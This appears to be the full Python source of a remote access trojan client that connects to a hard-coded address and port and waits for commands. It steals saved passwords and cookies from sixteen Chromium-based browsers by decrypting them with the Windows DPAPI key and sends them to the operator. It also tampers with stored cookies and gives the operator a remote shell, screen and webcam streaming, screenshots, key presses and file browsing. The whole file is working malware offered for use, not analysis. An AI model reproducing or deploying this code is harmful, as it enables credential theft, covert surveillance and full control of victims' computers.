import socket
import os
import subprocess
import json
from mss import mss
import mss.tools
import base64
import screeninfo
import threading
import keyboard
import cv2
import numpy as np

import colorama

import shutil
from Crypto.Cipher import AES
from datetime import datetime, timedelta
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
import win32crypt
import sqlite3
import base64

colorama.init(autoreset=True)

class Extract_Browser():

	def __init__(self) -> None:
		self.APPDATA = os.getenv("LOCALAPPDATA")
		self.LOGINS = []
		self.COOKIES = []

		self.paths = [
			['amigo', self.APPDATA + '\\Amigo'],
			['torch', self.APPDATA + '\\Torch'],
			['kometa', self.APPDATA + '\\Kometa'],
			['orbitum', self.APPDATA + '\\Orbitum'],
			['cent-browser', self.APPDATA + '\\CentBrowser'],
			['7star', self.APPDATA + '\\7Star\\7Star'],
			['sputnik', self.APPDATA + '\\Sputnik\\Sputnik'],
			['vivaldi', self.APPDATA + '\\Vivaldi'],
			['google-chrome-sxs', self.APPDATA + '\\Google\\Chrome SxS'],
			['google-chrome', self.APPDATA + '\\Google\\Chrome'],
			['epic-privacy-browser', self.APPDATA + '\\Epic Privacy Browser'],
			['microsoft-edge', self.APPDATA + '\\Microsoft\\Edge'],
			['uran', self.APPDATA + '\\uCozMedia\\Uran'],
			['yandex', self.APPDATA + '\\Yandex\\YandexBrowser'],
			['brave', self.APPDATA + '\\BraveSoftware\\Brave-Browser'],
			['iridium', self.APPDATA + '\\Iridium'],
		]

		self.exists = []

		for path in self.paths:
			if os.path.exists(path[1]):
				self.exists.append(path)
			else:
				pass


	def start_scrape(self):
		self.get_passwords()
		self.get_cookies()
		self.clean_all_db()

		return self.LOGINS, self.COOKIES

	def get_passwords(self):
		for browser_path in self.exists:
			key = self.get_encryption_key(path=browser_path[1])

			filename = f"{browser_path[0]}.db"
			shutil.copyfile(f"{browser_path[1]}\\User Data\\Default\\Login Data", filename)

			db = sqlite3.connect(filename)
			cursor = db.cursor()
			cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

			for row in cursor.fetchall():
				origin_url = row[0]
				action_url = row[1]
				username = row[2]
				password = self.decrypt_password(row[3], key)
				date_created = row[4]
				date_last_used = row[5]     
				if username or password:
					print(f"Origin URL: {origin_url}")
					print(f"Action URL: {action_url}")
					print(f"Username: {username}")
					print(f"Password: {password}")
				else:
					continue
				if date_created != 86400000000 and date_created:
					print(f"Creation date: {str(self.get_browser_datetime(date_created))}")
				if date_last_used != 86400000000 and date_last_used:
					print(f"Last Used: {str(self.get_browser_datetime(date_last_used))}")
					print("="*50)
				self.LOGINS.append({"USERNAME":f"{username}", "PASSWORD":f"{password}", "ORIGIN_URL":f"{origin_url}", "ACTION_URL":f"{action_url}"})
			cursor.close()
			db.close()
			try:
				# try to remove the copied db file
				os.remove(filename)
			except:
				pass

	def get_cookies(self):
		for browser_path in self.exists:
			key = self.get_encryption_key(path=browser_path[1])

			filename = f"{browser_path[0]}.db"
			shutil.copyfile(f"{browser_path[1]}\\User Data\\Default\\Network\\Cookies", filename)

			db = sqlite3.connect(filename)
			db.text_factory = lambda b: b.decode(errors="ignore")
			cursor = db.cursor()
			cursor.execute("""
			SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
			FROM cookies""")
			for host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value in cursor.fetchall():
				if not value:
					decrypted_value = self.decrypt_password(encrypted_value, key)
				else:
					decrypted_value = value
				print(f"""
Host: {host_key}
Cookie name: {name}
Cookie value (decrypted): {decrypted_value}
Creation datetime (UTC): {self.get_browser_datetime(creation_utc)}
Last access datetime (UTC): {self.get_browser_datetime(last_access_utc)}
Expires datetime (UTC): {self.get_browser_datetime(expires_utc)}
===============================================================
				""")
				self.COOKIES.append({"COOKIE_HOST":f"{host_key}", "COOKIE_NAME":f"{name}", "COOKIE_VALUE":f"{decrypted_value}", "COOKIE_EXPIRES":f"{self.get_browser_datetime(expires_utc)}"})

				cursor.execute("""
				UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
				WHERE host_key = ?
				AND name = ?""", (decrypted_value, host_key, name))
			db.commit()
			db.close()
			try:
				os.remove(filename)
			except:
				pass

	def get_encryption_key(self, path):

		with open(path + "\\User Data\\Local State", "r", encoding="utf-8") as f:
			local_state = f.read()
			local_state = json.loads(local_state)

		key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
		key = key[5:]
		return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
	
	def decrypt_password(self, password, key):
		try:
			iv = password[3:15]
			password = password[15:]
			cipher = AES.new(key, AES.MODE_GCM, iv)
			return cipher.decrypt(password)[:-16].decode()
		except:
			try:
				return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
			except:
				# not supported
				return ""

	def get_browser_datetime(self, chromedate):
		return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
	
	def clean_all_db(self):
		for browser_name in self.exists:
			try:
				os.remove(f"{browser_name[0]}.db")
			except:
				continue


def debug(*msg):
	debug = True
	if debug:
		timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S.%f]")
		try:
			print("{} {}".format(colorama.Fore.GREEN + timestamp, " ".join(msg)))
		except Exception as e:
			print("{} {} -> ERROR: {}".format(colorama.Fore.RED + timestamp, colorama.Fore.WHITE, msg))

class client:
	def __init__(self, ip, port, timeout):
		self.ip = ip
		self.port = port
		self.socket = socket.socket()
		self.socket.connect((self.ip,self.port))
		self.socket.settimeout(timeout)
		self.active = True
		self.cap = cv2.VideoCapture(0)


	def gethwid(self) -> str:
		if os.name == "nt":
			data = "reg query HKEY_USERS"
			runcmd = subprocess.Popen(data,shell=True, stdout=subprocess.PIPE)
			return runcmd.stdout.read().decode().split("\n")[4][11:40]
		return "UNKNOWN. POSSIBLY ON LINUX"

			
	def get_contents(self):
		values = {'hwid': self.gethwid(), "monitors": len(screeninfo.get_monitors())}
		data = json.dumps(values).encode('utf-8')
		return data

	def connect(self):
		data = self.get_contents()
		self.send(data)
		debug("SENT CONTENTS TO SERVER")
		self.menu()

	def recvall(self):
		try:
			data = bytearray()
			length = b""
			while True:
				packet_len = self.socket.recv(1)
				if packet_len != b" ":
					length += packet_len
				else:
					break
			length = int(length)
			while len(data) < length:
				packet = self.socket.recv(length - len(data))
				if not packet:
					return None
				data += packet
				debug(data)
			return data
		except Exception as e:
			debug(e)
						
	def screen_share(self, index):
		if int(index[3]) != -1:
			debug("PRESSING KEY {}".format(int(index[3])))
			keyboard.press(int(index[3]))
		with mss.mss() as sct:
			if index[1] == "ALL":
				data = sct.monitors[0]
			else:
				data = sct.monitors[int(index[1])]
			data = sct.grab(data)
			s_data = np.array(data)
			_, data = cv2.imencode('.jpg', s_data, [cv2.IMWRITE_JPEG_QUALITY, int(index[2])])
		image = base64.b64encode(data)
		self.send(b"record:" + image)

	def cam_share(self, qual):
		debug("Quality: " + qual)
		try:
			ret, frame = self.cap.read()
			frame = cv2.resize(cv2.flip(frame, 1), None, fx=1, fy=1, interpolation=cv2.INTER_AREA)
			data = cv2.imencode('.jpeg', frame, [cv2.IMWRITE_JPEG_QUALITY, int(qual)])[1]
			cv2.destroyAllWindows()
			debug("SENDING FRAME")
			self.send(b"wcam:" + base64.b64encode(data))
		except Exception as e:
			print(e)
			self.send(b"ERROR_WITH_CAM")

	def menu(self):
		while self.active:
			data = self.recvall().decode()

			debug("DATA RECIVED {}".format(data))

			if data == "HEXBYTE v.10":
				self.send(self.get_contents())
			elif data == "exit":
				self.active = False
			elif data.startswith("shell:"):
				runcmd = subprocess.Popen(data[6:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
				self.send(b"shell:" + runcmd.stdout.read() + (f"\n{os.getcwd()}".encode('utf-8')))
			elif data.startswith("screenshot:"):
				data = data.split(":")[1]
				with mss.mss() as sct:
					print(data)
					if data == "ALL":
						data = sct.monitors[-1]
					else:
						data = sct.monitors[int(data)]


					data = sct.grab(data)
					data = mss.tools.to_png(data.rgb, data.size)

				 
				image = base64.b64encode(data)
				print(data)
				print("===========================")
				print(image)
				self.send(b"screenshot:" + image)
			elif data == "start_record":
				self.send(b"recording")
			elif data == "start_cam":
				cap = cv2.VideoCapture(0)
				if not cap.isOpened():
					self.send(b"NO_CAM_AVALIBLE")
				else:
					self.send(b"camera")
				cap.release()
				cv2.destroyAllWindows()

			elif data=="scrape_data":
				scraper = Extract_Browser()
				LOGINS, COOKIES = scraper.start_scrape()
				self.send(b"SCRAPE_DATA:" + base64.b64encode(str(LOGINS).encode() + b"|" + str(COOKIES).encode()))
				LOGINS = []
				COOKIES = []


			elif data.startswith("cam:"):
				print("CAM")
				qual = data.split(":",1)[1]
				threading.Thread(target=self.cam_share, args=(qual, ), daemon=True).start()


			elif data.startswith("record:"):
				index = data.split(":")
				# print("Sceeen: {} {} {}".format(index[1], index[2], index[3]))
				threading.Thread(target=self.screen_share, args=(index, ), daemon=True).start()

			elif data == "files":
				items = []
				for item in os.listdir(os.getcwd()):
					path = os.path.join(os.getcwd(), item)
					item_type = 'Folder' if os.path.isdir(path) else 'File'
					items.append({'Name': item, 'Type': item_type})
				items.append({'Name':'CWD', 'Extension':os.getcwd()})
				data = b"Files->" + str(items).encode()
				self.send(data)
				print("sent files")
			elif data == "File Explorer":
				self.send(b"File Explorer")
			elif data.startswith("update:"):
				try:
					command = data.split(":",1)[1]
					os.chdir(command[3:])
					debug(F"CAHNGE DIR TO {command[3:]}")
				except:
					print("ERROR CHANGING DIRECTORY")

	def send(self, packet):
		self.socket.sendall(str(len(packet)).encode('utf-8') + b" " + packet)
		






client("192.168.1.49", 1111, None).connect()